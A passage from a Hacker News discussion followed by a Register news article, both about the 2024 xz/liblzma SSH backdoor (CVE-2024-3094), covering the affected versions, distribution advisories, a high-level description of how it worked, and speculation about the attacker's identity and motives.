ancient simple binary on newer systems is that someone has deliberately made that possible. People worked to make sure the environment around its boundary would stay the same instead of drifting randomly away with time—usually so doggedly (and thanklessly) that we can argue whether that stability was really a result of maintenance or just a fact of nature. | | --- | --- | --- | | | |  |  | [asveikau](user?id=asveikau) [9 months ago](item?id=39880808)   | [root](#39878019) | [parent](#39880530) | [next](#39879479) [–]  > The reason you can run an ancient simple binary on newer systems is that someone has deliberately made that possible. I'm not talking about binaries. I'm talking about C sources. I've done the kind of work you're talking about. You're overestimating it. | | --- | --- | --- | | | |  |  | [bulatb](user?id=bulatb) [9 months ago](item?id=39880894)   | [root](#39878019) | [parent](#39880808) | [next](#39879479) [–]  I must have misread "plop that kind of library" as "plop that kind of binary" about five times. My bad. | | --- | --- | --- | | | |  |  | [empath-nirvana](user?id=empath-nirvana) [9 months ago](item?id=39879479)   | [parent](#39878019) | [prev](#39878622) | [next](#39881661) [–]  2 popular and well tested rust yaml libraries have recently been marked as unmaintained and people are moving away from them to brand new projects in a rush because warnings went out about it. | | --- | --- | --- | | | |  |  | [arp242](user?id=arp242) [9 months ago](item?id=39881661)   | [parent](#39878019) | [prev](#39879479) | [next](#39882514) [–]  > There was nothing wrong with "unmaintained" lzma two years ago. Well, that's not exactly true. The first patch from Jia Tan is a minor documentation fix, and the second is a bugfix which, according to the commit message (by Collin), "breaks the decoder badly". There's a few more patches after that that fix real issues. Mark Adler's zlib has been around for a lot longer than xz/liblzma, and there's still bugfixes to that, too. | | --- | --- | --- | | | |  |  | [\_zoltan\_](user?id=_zoltan_) [9 months ago](item?id=39882514)   | [parent](#39878019) | [prev](#39881661) | [next](#39879559) [–]  I was just looking at headscale. Last release mid 2023. I had immediately asked myself: is this even maintained anymore? I think this is a very valid question to ask. | | --- | --- | --- | | | |  |  | [transpute](user?id=transpute) [9 months ago](item?id=39879559)   | [prev](#39878019) | [next](#39877716) [–]  SE Linux comment by @poettering, <https://news.ycombinator.com/item?id=39867126> *> Libselinux pulls in liblzma too and gets linked into tons more programs than libsystemd. And will end up in sshd too (at the very least via libpam/pam\_selinux). And most of the really big distros tend do support selinux at least to some level. Hence systemd or not, sshd remains vulnerable by this specific attack.* Devuan comment by @capitainenemo, <https://news.ycombinator.com/item?id=39866190> *> The sshd in Devuan does link to a libsystemd stub - this is to cut down on their maintenance of upstream packages. However that stub does not link to lzma.* Future proofing, <https://gynvael.coldwind.pl/?lang=en&id=782> ```   Stage 2 "extension" mechanism    This whole thing basically looks like an "extension/patching" system that would allow adding future scripts to be run in the context of Stage 2, without having to modify the original payload-carrying test files. Which makes sense, as modyfing a "bad" and "good" test files over and over again is pretty suspicious. So the plan seemed to be to just add new test files instead, which would have been picked up, deciphered, and executed. ``` | | --- | --- | --- | | | |  |  | [gavinhoward](user?id=gavinhoward) [9 months ago](item?id=39877716)   | [prev](#39879559) | [next](#39878924) [–]  If that's true, then I am 100% certain that this backdoor is from a nation state-level actor. | | --- | --- | --- | | | |  |  | [jeroenhd](user?id=jeroenhd) [9 months ago](item?id=39877812)   | [parent](#39877716) | [next](#39877725) [–]  I already felt like this was way too sophisticated for a random cybercriminal. It's not like making up fake internet identities is very difficult, but someone has pretended to be a good-faith contributor for ages, in a surprisingly long-term operation. You need some funding and a good reason to pull off something like that. This could also be a ransomware group hoping to break into huge numbers of servers, though. Ransomware groups have been getting more sophisticated and they will already infiltrate their targets for months at a time (to make sure all old backups are useless when they strike), so I wouldn't put it past them to infiltrate the server authentication mechanism directly. | | --- | --- | --- | | | |  |  | [TheBlight](user?id=TheBlight) [9 months ago](item?id=39877961)   | [root](#39877716) | [parent](#39877812) | [next](#39878323) [–]  Whoever this was is going after a government or a crypto exchange. Don't think anything else merits this effort. | | --- | --- | --- | | | |  |  | [dralley](user?id=dralley) [9 months ago](item?id=39878117)   | [root](#39877716) | [parent](#39877961) | [next](#39878041) [–]  I don't know that they had a singular target necessarily. Much like Solarwinds, they could take their pick of thousands of targets if this had gone undetected. | | --- | --- | --- | | | |  |  | [TheBlight](user?id=TheBlight) [9 months ago](item?id=39878196)   | [root](#39877716) | [parent](#39878117) | [next](#39878041) [–]  I think we can all agree this attacker was sophisticated. But why would a government want to own tons of random Linux machines that have open sshd mappings? You have to expose sshd explicitly in most cloud environments (or on interesting networks worthy of attack.) Besides, the attacker must've known that if this is all over the internet eventually someone is going to notice. I think the attacker had a target in mind. They were clearly focused on specific Linux distros. I'd imagine they were after a specific set of sshd bastion machine(s). Maybe they have the ability to get on the VPN that has access to the bastion(s) but the subset of users with actual bastion access is perhaps much smaller and more alert/less vulnerable to phishing. So what's going to be the most valuable thing to hack that uses Linux sshd bastions? Something so valuable it's worth dedicating ~3 years of your life to it? My best guess is a crypto exchange. | | --- | --- | --- | | | |  |  | [icegreentea2](user?id=icegreentea2) [9 months ago](item?id=39878733)   | [root](#39877716) | [parent](#39878196) | [next](#39878591) [–]  > Something so valuable it's worth dedicating ~3 years of your life to it? This isn't the right mindset if you want to consider a state actor, particularly for something like contributing to an open source project. It's not like you had to physically live your cover life while trying infiltrate a company or something. Yes, this is a lot of resources to spend, but at the same, even dedicating one whole FTE 3 years isn't that much resources. It's just salary at that point. | | --- | --- | --- | | | |  |  | [baq](user?id=baq) [9 months ago](item?id=39878591)   | [root](#39877716) | [parent](#39878196) | [prev](#39878733) | [next](#39879351) [–]  > But why would a government want to own tons of random Linux machines that have open sshd mappings? They don’t want tons. They want the few important ones. Turns out it was easiest to get to the important ones by pwning tons of random ones. | | --- | --- | --- | | | |  |  | [TheBlight](user?id=TheBlight) [9 months ago](item?id=39878650)   | [root](#39877716) | [parent](#39878591) | [next](#39879351) [–]  That still implies there was a target in mind. But also they would've had to assume the access would be relatively short-lived. This means to me they had something specific they wanted to get access to, didn't plan to be there long, and weren't terribly concerned about leaving a trail of their methods. | | --- | --- | --- | | | |  |  | [pessimizer](user?id=pessimizer) [9 months ago](item?id=39879477)   | [root](#39877716) | [parent](#39878650) | [next](#39879351) [–]  Why couldn't they have had 50 or 100 targets in mind, and hoped that the exploit would last for at least the month (or whatever) they needed to accomplish their multiple, unrelated goals? I think your imagination is telling you a story that is prematurely limiting the range of real possibilities. | | --- | --- | --- | | | |  |  | [Ekaros](user?id=Ekaros) [9 months ago](item?id=39879351)   | [root](#39877716) | [parent](#39878196) | [prev](#39878591) | [next](#39878041) [–]  Government have lot of money and time to spend. So having one more tool in box for that single time you need to access a target where this work is entirely reasonable investment. Would this if it weren't used have been noticed possibly in years? That gives quite a lot of room to find target for times when it is needed. And you could have multiple projects doing this type of work in parallel. | | --- | --- | --- | | | |  |  | [delfinom](user?id=delfinom) [9 months ago](item?id=39878041)   | [root](#39877716) | [parent](#39877961) | [prev](#39878117) | [next](#39878323) [–]  Otoh, maybe they just wanted to create a cryptomining farm. Lol. Don't underestimate the drive some people have to make a buck. | | --- | --- | --- | | | |  |  | [1oooqooq](user?id=1oooqooq) [9 months ago](item?id=39881933)   | [root](#39877716) | [parent](#39878041) | [next](#39878323) [–]  people downvoting you already forgot the cia fundraiser in the 80s... | | --- | --- | --- | | | |  |  | [neffy](user?id=neffy) [9 months ago](item?id=39878323)   | [root](#39877716) | [parent](#39877812) | [prev](#39877961) | [next](#39878509) [–]  Those guys are estimated to have made $1 billion last year - have to think that buys some developer talent. | | --- | --- | --- | | | |  |  | [BoardsOfCanada](user?id=BoardsOfCanada) [9 months ago](item?id=39878509)   | [root](#39877716) | [parent](#39877812) | [prev](#39878323) | [next](#39877725) [–]  I would expect a nation state to have better sock puppet accounts though. | | --- | --- | --- | | | |  |  | [nemothekid](user?id=nemothekid) [9 months ago](item?id=39878725)   | [root](#39877716) | [parent](#39878509) | [next](#39877725) [–]  >*better sock puppet accounts though.* Seems like to me they had perfectly good enough sock puppet accounts. It wasn't at all obvious they were sock puppets until someone detected the expliot. | | --- | --- | --- | | | |  |  | [junon](user?id=junon) [9 months ago](item?id=39877725)   | [parent](#39877716) | [prev](#39877812) | [next](#39878174) [–]  That's what this feels like. That, or someone who wanted to sell this to one. Can't imagine the ABC's are sleeping on this one at this point. | | --- | --- | --- | | | |  |  | [ignoramous](user?id=ignoramous) [9 months ago](item?id=39878174)   | [parent](#39877716) | [prev](#39877725) | [next](#39877994) [–]  I imagine such actors are embed within major consumer tech teams, too: Twitter, TikTok, Chrome, Snap, WhatsApp, Instagram... covers ~70% of all humanity. | | --- | --- | --- | | | |  |  | [therein](user?id=therein) [9 months ago](item?id=39882557)   | [root](#39877716) | [parent](#39878174) | [next](#39877994) [–]  This could be something that agent that infiltrated into companies could use to execute stuff on internal hosts that they have SSH connectivity to but no access. You could get into bastion hosts and then to PROD and leave no log traces. | | --- | --- | --- | | | |  |  | [fuzunoglu](user?id=fuzunoglu) [9 months ago](item?id=39877994)   | [parent](#39877716) | [prev](#39878174) | [next](#39878924) [–]  What is the possibility of identity theft that is commenced on state-level? There are reports that the time the backdoor was pushed do not match the usual timing of changes committed by the author. It also seems like a convenient ground for a false flag operation: hijacking an account that belong to a trustworthy developer from another country. | | --- | --- | --- | | | |  |  | [Aloisius](user?id=Aloisius) [9 months ago](item?id=39878154)   | [root](#39877716) | [parent](#39877994) | [next](#39878924) [–]  And risk discovery by the trustworthy developer? Unlikely. | | --- | --- | --- | | | |  |  | [fuzunoglu](user?id=fuzunoglu) [9 months ago](item?id=39880014)   | [root](#39877716) | [parent](#39878154) | [next](#39878924) [–]  What if the developer passed away? It is also easy to blame the developer with mental issues otherwise. | | --- | --- | --- | | | |  |  | [KennyBlanken](user?id=KennyBlanken) [9 months ago](item?id=39878924)   | [prev](#39877716) | [next](#39879669) [3 more]  [flagged] | | --- | --- | --- | | | |  |  | [skybrian](user?id=skybrian) [9 months ago](item?id=39879004)   | [parent](#39878924) | [next](#39879050) [–]  Does the Go SDK even have any third-party dependencies? How could something like the XZ backdoor happen? Also, given that Go binaries are statically linked, if you can't rebuild from source, you're screwed. You need to get good at building from source. | | --- | --- | --- | | | |  |  | [fbdab103](user?id=fbdab103) [9 months ago](item?id=39879050)   | [parent](#39878924) | [prev](#39879004) | [next](#39879669) [–]  I do not know why I read Golang issue threads. I always get angry at the we-know-better attitude. With just a dash of, "Well, that's not how Google does it. Why don't you just do better internally?" | | --- | --- | --- | | | |  |  | [thegrim000](user?id=thegrim000) [9 months ago](item?id=39879669)   | [prev](#39878924) | [next](#39880273) [–]  I've seen a lot of discussion on the topic but have yet to see someone just specify which versions of xz are likely affected so that I can verify whether I'm running them or not .. | | --- | --- | --- | | | |  |  | [aftbit](user?id=aftbit) [9 months ago](item?id=39879736)   | [parent](#39879669) | [next](#39880273) [–]  Ask your distro. On Arch, it's 5.6.0-1 and 5.6.1-1. Most of Debian (outside sid/unstable) is unaffected, as allegedly is Red Hat. [https://archlinux.org/news/the-xz-package-has-been-backdoore...](https://archlinux.org/news/the-xz-package-has-been-backdoored/) | | --- | --- | --- | | | |  |  | [xuhu](user?id=xuhu) [9 months ago](item?id=39880273)   | [prev](#39879669) | [next](#39880678) [–]  It just seems implausible that the malicious x86 code would not have shown up in strace, perf record, or some backtrace. Once this ended up in all the major distros, some syscall or glibc call would have eventually looked like a red flag to someone before long. | | --- | --- | --- | | | |  |  | [lettergram](user?id=lettergram) [9 months ago](item?id=39880678)   | [prev](#39880273) | [next](#39880812) [–]  What I’d like to understand is it’s proven intentional? My understanding is it was a few added characters in a header file. I can’t tell you the number of times I was tired and clicked an extra key before committing, or my cat walked across the keyboard while I was out of the room. | | --- | --- | --- | | | |  |  | [kortilla](user?id=kortilla) [9 months ago](item?id=39882354)   | [parent](#39880678) | [next](#39880736) [–]  You should read up on the attack. The few characters were part of avoiding a specific case of detection. The back door is very large, is only added during tar build, and happens to only work when a special key is presented. | | --- | --- | --- | | | |  |  | [userbinator](user?id=userbinator) [9 months ago](item?id=39880736)   | [parent](#39880678) | [prev](#39882354) | [next](#39882079) [–]  That level of sophistication is certainly intentional. | | --- | --- | --- | | | |  |  | [lettergram](user?id=lettergram) [9 months ago](item?id=39880919)   | [root](#39880678) | [parent](#39880736) | [next](#39882079) [–]  That’s not an explanation about exactly how intention was derived. I suppose I’m asking for the chain of events that led to the conclusion. I see lots of technical hot takes for how something could work, with no validation it does, nor intent behind it. I’d like to understand what steps we know were taken and how that presents itself. | | --- | --- | --- | | | |  |  | [willbush](user?id=willbush) [9 months ago](item?id=39881249)   | [root](#39880678) | [parent](#39880919) | [next](#39882079) [–]  I think you're probably missing a lot context about the situation. Here's some useful links [https://x0f.org/@FreePietje/112187047353892463](https://x0f.org/%40FreePietje/112187047353892463) also <https://gynvael.coldwind.pl/?lang=en&id=782> | | --- | --- | --- | | | |  |  | [lettergram](user?id=lettergram) [9 months ago](item?id=39885615)   | [root](#39880678) | [parent](#39881249) | [next](#39882079) [–]  Appreciate, that’s the context I was looking for | | --- | --- | --- | | | |  |  | [adtac](user?id=adtac) [9 months ago](item?id=39882079)   | [parent](#39880678) | [prev](#39880736) | [next](#39880812) [–]  It was a few added characters in a header file to make it possible to deliver the actual payload: 80+ kilobytes of machine code. There's no way to actually tell, but I'd estimate the malware source code to be O(10000) lines in C. It's actually pretty sophisticated. You don't accidentally write a in-memory ELF program header parser. | | --- | --- | --- | | | |  |  | [brcmthrowaway](user?id=brcmthrowaway) [9 months ago](item?id=39880812)   | [prev](#39880678) | [next](#39880228) [–]  So this is why Apple hates open source. Random anons committing to your project. | | --- | --- | --- | | | |  |  | [Bnichs](user?id=Bnichs) [9 months ago](item?id=39884001)   | [parent](#39880812) | [next](#39880228) [–]  I think their problem with open source is more that they can't have complete control and make every user's decision for them, security is just a nice tag along to that. | | --- | --- | --- | | | |  |  | [snnn](user?id=snnn) [9 months ago](item?id=39880228)   | [prev](#39880812) [–]  Maybe we should consider moving more and more system process to webassembly. wasmtime has a nice sandbox. Surely it will decrease the performance, but performance is not always that important. For example, on my dev machine even if SSHD or apache's performance dropped 3x because of that, I wouldn't mind. If I really care, spend more money to get a more powerful CPU. | | --- | --- | --- | | |
| |  | | --- |   [Guidelines](newsguidelines.html) | [FAQ](newsfaq.html) | [Lists](lists) | [API](https://github.com/HackerNews/API) | [Security](security.html) | [Legal](https://www.ycombinator.com/legal/) | [Apply to YC](https://www.ycombinator.com/apply/) | Contact Search: |



=== Content from www.theregister.com_dfd025c7_20250111_034044.html ===


[![](/design_picker/ae01b183a707a7db8cd5f2c947715ed56d335138/graphics/std/user_icon_white_extents_16x16.png)
![](/design_picker/ae01b183a707a7db8cd5f2c947715ed56d335138/graphics/std/user_icon_white_filled_extents_16x16.png)
Sign in / up](https://account.theregister.com/register/)

[![The Register® — Biting the hand that feeds IT](/design_picker/fa16d26efb42e6ba1052f1d387470f643c5aa18d/graphics/std/reg_logo_no_strapline.png)](https://www.theregister.com/)

[![](/design_picker/ae01b183a707a7db8cd5f2c947715ed56d335138/graphics/std/magnifying_glass_white_extents_16x16.png)](https://search.theregister.com/)

![](/design_picker/ae01b183a707a7db8cd5f2c947715ed56d335138/graphics/icon/burger_menu_white_16x16.png)
![](/design_picker/ae01b183a707a7db8cd5f2c947715ed56d335138/graphics/icon/burger_menu_white_close_16x16.png)

## Topics

[Security](#subnav-box-nav-security)
## [Security](#subnav-box-nav-security)

[All Security](https://www.theregister.com/security/)[Cyber-crime](https://www.theregister.com/security/cyber_crime/)[Patches](https://www.theregister.com/security/patches/)[Research](https://www.theregister.com/security/research/)[CSO](https://www.theregister.com/security/cso/)
[(X)](#masthead)

[Off-Prem](#subnav-box-nav-off_prem)
## [Off-Prem](#subnav-box-nav-off_prem)

[All Off-Prem](https://www.theregister.com/off_prem/)[Edge + IoT](https://www.theregister.com/off_prem/edge_iot/)[Channel](https://www.theregister.com/off_prem/channel/)[PaaS + IaaS](https://www.theregister.com/off_prem/paas_iaas/)[SaaS](https://www.theregister.com/off_prem/saas/)
[(X)](#masthead)

[On-Prem](#subnav-box-nav-on_prem)
## [On-Prem](#subnav-box-nav-on_prem)

[All On-Prem](https://www.theregister.com/on_prem/)[Systems](https://www.theregister.com/on_prem/systems/)[Storage](https://www.theregister.com/on_prem/storage/)[Networks](https://www.theregister.com/on_prem/networks/)[HPC](https://www.theregister.com/on_prem/hpc/)[Personal Tech](https://www.theregister.com/on_prem/personal_tech/)[CxO](https://www.theregister.com/on_prem/cxo/)[Public Sector](https://www.theregister.com/on_prem/public_sector/)
[(X)](#masthead)

[Software](#subnav-box-nav-software)
## [Software](#subnav-box-nav-software)

[All Software](https://www.theregister.com/software/)[AI + ML](https://www.theregister.com/software/ai_ml/)[Applications](https://www.theregister.com/software/applications/)[Databases](https://www.theregister.com/software/databases/)[DevOps](https://www.theregister.com/software/devops/)[OSes](https://www.theregister.com/software/oses/)[Virtualization](https://www.theregister.com/software/virtualization/)
[(X)](#masthead)

[Offbeat](#subnav-box-nav-offbeat)
## [Offbeat](#subnav-box-nav-offbeat)

[All Offbeat](https://www.theregister.com/offbeat/)[Debates](https://www.theregister.com/Debates/)[Columnists](https://www.theregister.com/offbeat/columnists/)[Science](https://www.theregister.com/offbeat/science/)[Geek's Guide](https://www.theregister.com/offbeat/geeks_guide/)[BOFH](https://www.theregister.com/offbeat/bofh/)[Legal](https://www.theregister.com/offbeat/legal/)[Bootnotes](https://www.theregister.com/offbeat/bootnotes/)[Site News](https://www.theregister.com/offbeat/site_news/)[About Us](https://www.theregister.com/offbeat/about_us/)
[(X)](#masthead)

[Special Features](#subnav-box-nav-special_features)
## Special Features

[All Special Features](https://www.theregister.com/special_features)
[The Future of the Datacenter](https://www.theregister.com/special_features/future_of_the_datacenter)
[Cybersecurity Month](https://www.theregister.com/special_features/cybersecurity_month)
[VMware Explore](https://www.theregister.com/special_features/vmware_explore)
[Cloud Infrastructure Month](https://www.theregister.com/special_features/cloud_infrastructure_month)

## Vendor Voice

[Vendor Voice](#subnav-box-nav-tag-vendor-voice)
## [Vendor Voice](#subnav-box-nav-tag-vendor-voice)

[All Vendor Voice](https://www.theregister.com/VendorVoice/)
[Pure Storage](https://www.theregister.com/VendorVoice/pure_storage_portworx/)
[Kilka Tech](https://www.theregister.com/VendorVoice/aws_klika_tech/)
[HERE and AWS](https://www.theregister.com/VendorVoice/aws_here/)
[Vonage](https://www.theregister.com/VendorVoice/aws_vonage/)
[GE Vernova with AWS](https://www.theregister.com/VendorVoice/aws_ge_vernova_manufacturing/)
[Amazon Web Services (AWS) New Horizon in Cloud Computing](https://www.theregister.com/VendorVoice/aws_new_horizon_solutions/)
[DDN](https://www.theregister.com/VendorVoice/ddn/)
[Google Cloud Data Transformation](https://www.theregister.com/VendorVoice/google_cloud_data_transformation/)
[Google Gemini](https://www.theregister.com/VendorVoice/google_gemini/)
[Hewlett Packard Enterprise: Edge-to-Cloud Platform](https://www.theregister.com/VendorVoice/hpe_greenlake/)
[Intel vPro](https://www.theregister.com/VendorVoice/intelvpro/)
[VMware](https://www.theregister.com/VendorVoice/vmware/)
[(X)](#masthead)

[Resources](#subnav-box-nav-resources)
## Resources

[Whitepapers](https://whitepapers.theregister.com/)
[Webinars & Events](https://whitepapers.theregister.com/events/list/)
[Newsletters](https://account.theregister.com/edit/newsletter/)

[![](https://pubads.g.doubleclick.net/gampad/ad?co=1&iu=/6978/reg_security/cso&sz=300x50%7C300x100%7C300x250%7C300x251%7C300x252%7C300x600%7C300x601&tile=2&c=2Z4HoOzK4FuHbq-6fef6TIwAAANI&t=ct%3Dns%26unitnum%3D2%26raptor%3Dcondor%26pos%3Dtop%26test%3D0)](https://pubads.g.doubleclick.net/gampad/jump?co=1&iu=/6978/reg_security/cso&sz=300x50%7C300x100%7C300x250%7C300x251%7C300x252%7C300x600%7C300x601&tile=2&c=2Z4HoOzK4FuHbq-6fef6TIwAAANI&t=ct%3Dns%26unitnum%3D2%26raptor%3Dcondor%26pos%3Dtop%26test%3D0)

#### [CSO](/security/cso/)

[**123**
![comment bubble on white](/design_picker/f5daacc84b9722c1e31ba85f836c37e4ad993fc4/graphics/icons/bubble_comment_white.png)](https://forums.theregister.com/forum/all/2024/03/29/malicious_backdoor_xz/ "View comments on this article")

# Malicious SSH backdoor sneaks into xz, Linux world's data compression library

[**123**
![comment bubble on white](/design_picker/f5daacc84b9722c1e31ba85f836c37e4ad993fc4/graphics/icons/bubble_comment_white.png)](https://forums.theregister.com/forum/all/2024/03/29/malicious_backdoor_xz/ "View comments on this article")

## STOP USAGE OF FEDORA RAWHIDE, says Red Hat while Debian Unstable and others also affected

![icon](/design_picker/d518b499f8a6e2c65d4d8c49aca8299d54b03012/graphics/icon/vulture_red.svg)
[Thomas Claburn](/Author/Thomas-Claburn "Read more by this author")

Fri 29 Mar 2024  //
21:58 UTC

![](/design_picker/d2e337b97204af4aa34dda04c4e5d56d954b216f/graphics/icons/social_share_icon.svg)

Red Hat on Friday warned that a malicious backdoor found in the widely used data compression software library xz may be present in instances of Fedora Linux 40 and the Fedora Rawhide developer distribution.

The IT giant said the malicious code, which appears to provide remote backdoor access via OpenSSH and systemd at least, is present in xz 5.6.0 and 5.6.1. The vulnerability has been designated [CVE-2024-3094](https://access.redhat.com/security/cve/CVE-2024-3094). It is rated 10 out of 10 in CVSS severity.

Users of Fedora Linux 40 may have received 5.6.0, depending upon the timing of their system updates, according to Red Hat. And users of Fedora Rawhide, the current development version of what will become Fedora Linux 41, may have received 5.6.1. Fedora 40 and 41 have not been officially released yet; version 40 is due out next month.

[![](https://pubads.g.doubleclick.net/gampad/ad?co=1&iu=/6978/reg_security/cso&sz=300x50%7C300x100%7C300x250%7C300x251%7C300x252%7C300x600%7C300x601&tile=2&c=2Z4HoOzK4FuHbq-6fef6TIwAAANI&t=ct%3Dns%26unitnum%3D2%26raptor%3Dcondor%26pos%3Dtop%26test%3D0)](https://pubads.g.doubleclick.net/gampad/jump?co=1&iu=/6978/reg_security/cso&sz=300x50%7C300x100%7C300x250%7C300x251%7C300x252%7C300x600%7C300x601&tile=2&c=2Z4HoOzK4FuHbq-6fef6TIwAAANI&t=ct%3Dns%26unitnum%3D2%26raptor%3Dcondor%26pos%3Dtop%26test%3D0)

Users of other Linux and OS distributions should check to see which version of the xz suite they have installed. The infected versions, 5.6.0 and 5.6.1, were [released](https://github.com/tukaani-project/xz/blob/master/NEWS) on February 24 and March 9, respectively, and may not been incorporated into too many people's deployments.

[![](https://pubads.g.doubleclick.net/gampad/ad?co=1&iu=/6978/reg_security/cso&sz=300x50%7C300x100%7C300x250%7C300x251%7C300x252%7C300x600%7C300x601&tile=4&c=44Z4HoOzK4FuHbq-6fef6TIwAAANI&t=ct%3Dns%26unitnum%3D426raptor%3Dfalcon%26pos%3Dmid%26test%3D0)](https://pubads.g.doubleclick.net/gampad/jump?co=1&iu=/6978/reg_security/cso&sz=300x50%7C300x100%7C300x250%7C300x251%7C300x252%7C300x600%7C300x601&tile=4&c=44Z4HoOzK4FuHbq-6fef6TIwAAANI&t=ct%3Dns%26unitnum%3D4%26raptor%3Dfalcon%26pos%3Dmid%26test%3D0)

[![](https://pubads.g.doubleclick.net/gampad/ad?co=1&iu=/6978/reg_security/cso&sz=300x50%7C300x100%7C300x250%7C300x251%7C300x252%7C300x600%7C300x601&tile=3&c=33Z4HoOzK4FuHbq-6fef6TIwAAANI&t=ct%3Dns%26unitnum%3D3%26raptor%3Deagle%26pos%3Dmid%26test%3D0)](https://pubads.g.doubleclick.net/gampad/jump?co=1&iu=/6978/reg_security/cso&sz=300x50%7C300x100%7C300x250%7C300x251%7C300x252%7C300x600%7C300x601&tile=3&c=33Z4HoOzK4FuHbq-6fef6TIwAAANI&t=ct%3Dns%26unitnum%3D3%26raptor%3Deagle%26pos%3Dmid%26test%3D0)

This supply-chain compromise may have been caught early enough to prevent widespread exploitation, and it may only mainly affect bleeding-edge distros that picked up the latest xz versions right away.

[Debian Unstable](https://security-tracker.debian.org/tracker/CVE-2024-3094) and [Kali Linux](https://twitter.com/kalilinux/status/1773786266074513523) have indicated they are, like Fedora, affected; all users should take action to identify and remove any backdoored builds of xz.

[![](https://pubads.g.doubleclick.net/gampad/ad?co=1&iu=/6978/reg_security/cso&sz=300x50%7C300x100%7C300x250%7C300x251%7C300x252%7C300x600%7C300x601&tile=4&c=44Z4HoOzK4FuHbq-6fef6TIwAAANI&t=ct%3Dns%26unitnum%3D426raptor%3Dfalcon%26pos%3Dmid%26test%3D0)](https://pubads.g.doubleclick.net/gampad/jump?co=1&iu=/6978/reg_security/cso&sz=300x50%7C300x100%7C300x250%7C300x251%7C300x252%7C300x600%7C300x601&tile=4&c=44Z4HoOzK4FuHbq-6fef6TIwAAANI&t=ct%3Dns%26unitnum%3D4%26raptor%3Dfalcon%26pos%3Dmid%26test%3D0)

"PLEASE IMMEDIATELY STOP USAGE OF ANY FEDORA RAWHIDE INSTANCES for work or personal activity," the IBM subsidiary's [advisory](https://www.redhat.com/en/blog/urgent-security-alert-fedora-41-and-rawhide-users) shouted from the rooftops today. "Fedora Rawhide will be reverted to xz-5.4.x shortly, and once that is done, Fedora Rawhide instances can safely be redeployed."

Red Hat Enterprise Linux (RHEL) is *not* affected.

* [Easy-to-use make-me-root exploit lands for recent Linux kernels. Get patching](https://www.theregister.com/2024/03/29/linux_kernel_flaw/)
* [Open source software has its perks, but supply chain risks can't be ignored](https://www.theregister.com/2023/02/22/open_software_supply_chain_risks/)
* [Sysadmins: Why not simply verify there's no backdoor in every program you install, and thus avoid any cyber-drama?](https://www.theregister.com/2021/07/31/enisa_supply_chain_attack_report/)
* [CIOs largely believe their software supply chain is vulnerable](https://www.theregister.com/2022/05/31/cio_supply_chain/)
* [How 'sleeper agent' AI assistants can sabotage your code without you realizing](https://www.theregister.com/2024/01/16/poisoned_ai_models/)

The malicious code in xz versions 5.6.0 and 5.6.1 has been obfuscated, Red Hat says, and is only fully present in the source code tarball. Second-stage artifacts within the Git repo get turned into malicious code through the M4 macro in the repo during the build process. The resulting poisoned xz library is unwittingly used by software, such as the operating system's systemd, after the library has been distributed and installed. The malware appears to have been engineered to alter the operation of OpenSSH server daemons that employ the library via systemd.

"The resulting malicious build interferes with authentication in sshd via systemd," Red Hat explains. "SSH is a commonly used protocol for connecting remotely to systems, and sshd is the service that allows access."

This authentication interference has the potential to allow a miscreant to gain unauthorized remote access to an affected system. In summary, the backdoor appears to work like this: Linux machines install the backdoored xz library – specifically, liblzma – and this dependency in turn is ultimately used in some way by the computer's OpenSSH daemon. At that point, the poisoned xz library is able to meddle with the daemon, and potentially allow in an unauthorized miscreant from across the network or internet.

[![](https://pubads.g.doubleclick.net/gampad/ad?co=1&iu=/6978/reg_security/cso&sz=300x50%7C300x100%7C300x250%7C300x251%7C300x252%7C300x600%7C300x601&tile=3&c=33Z4HoOzK4FuHbq-6fef6TIwAAANI&t=ct%3Dns%26unitnum%3D3%26raptor%3Deagle%26pos%3Dmid%26test%3D0)](https://pubads.g.doubleclick.net/gampad/jump?co=1&iu=/6978/reg_security/cso&sz=300x50%7C300x100%7C300x250%7C300x251%7C300x252%7C300x600%7C300x601&tile=3&c=33Z4HoOzK4FuHbq-6fef6TIwAAANI&t=ct%3Dns%26unitnum%3D3%26raptor%3Deagle%26pos%3Dmid%26test%3D0)

As Red Hat put it:

Under the right circumstances this interference could potentially enable a malicious actor to break sshd authentication and gain unauthorized access to the entire system remotely.

A [post](https://www.openwall.com/lists/oss-security/2024/03/29/4) to the Openwall security mailing list by Andres Freund, PostgreSQL developer and commiter, explores the vulnerability in greater detail.

## AI hallucinates software packages and devs download them

[READ MORE](https://www.theregister.com/2024/03/28/ai_bots_hallucinate_software_packages/)

"The backdoor initially intercepts execution by replacing the ifunc resolvers crc32\_resolve(), crc64\_resolve() with different code, which calls \_get\_cpuid(), injected into the code (which previously would just be static inline functions). In xz 5.6.1 the backdoor was further obfuscated, removing symbol names," Freund explains, with the caveat that he's not a security researcher or reverse engineer.

Freund speculates that the code "seems likely to allow some form of access or other form of remote code execution."

The account name associated with the offending commits, together with other details like the time those commits were made, has led to [speculation](https://news.ycombinator.com/item?id=39865810) that the author of the malicious code is a sophisticated attacker, possibly affiliated with a nation-state agency.

The US government's Cybersecurity and Infrastructure Security Agency (CISA) has already issued an advisory [here](https://www.cisa.gov/news-events/alerts/2024/03/29/reported-supply-chain-compromise-affecting-xz-utils-data-compression-library-cve-2024-3094). ®

***Don't miss** the latest on the xz backdoor. [More details here on The Register](https://www.theregister.com/2024/04/01/xz_backdoor_open_source/).*

**Get our** [Tech Resources](https://whitepapers.theregister.com/)

![](/design_picker/d2e337b97204af4aa34dda04c4e5d56d954b216f/graphics/icons/social_share_icon.svg)
Share

#### More about

* [Linux](/Tag/Linux/)
* [Red Hat](/Tag/Red%20Hat/)
* [Security](/Tag/Security/)

More like these

×
### More about

* [Linux](/Tag/Linux/)
* [Red Hat](/Tag/Red%20Hat/)
* [Security](/Tag/Security/)
* [Software](/Tag/Software/)

### Narrower topics

* [2FA](/Tag/2FA/)
* [AdBlock Plus](/Tag/AdBlock%20Plus/)
* [Advanced persistent threat](/Tag/Advanced%20persistent%20threat/)
* [App](/Tag/App/)
* [Application Delivery Controller](/Tag/Application%20Delivery%20Controller/)
* [Asahi Linux](/Tag/Asahi%20Linux/)
* [Audacity](/Tag/Audacity/Audio%20Editor/ "Disambiguation: Audio Editor")
* [Authentication](/Tag/Authentication/)
* [BEC](/Tag/BEC/)
* [Black Hat](/Tag/Black%20Hat/)
* [BSides](/Tag/BSides/)
* [Bug Bounty](/Tag/Bug%20Bounty/)
* [CentOS](/Tag/CentOS/)
* [CHERI](/Tag/CHERI/)
* [Common Vulnerability Scoring System](/Tag/Common%20Vulnerability%20Scoring%20System/)
* [Confluence](/Tag/Confluence/)
* [Cybercrime](/Tag/Cybercrime/)
* [Cybersecurity](/Tag/Cybersecurity/)
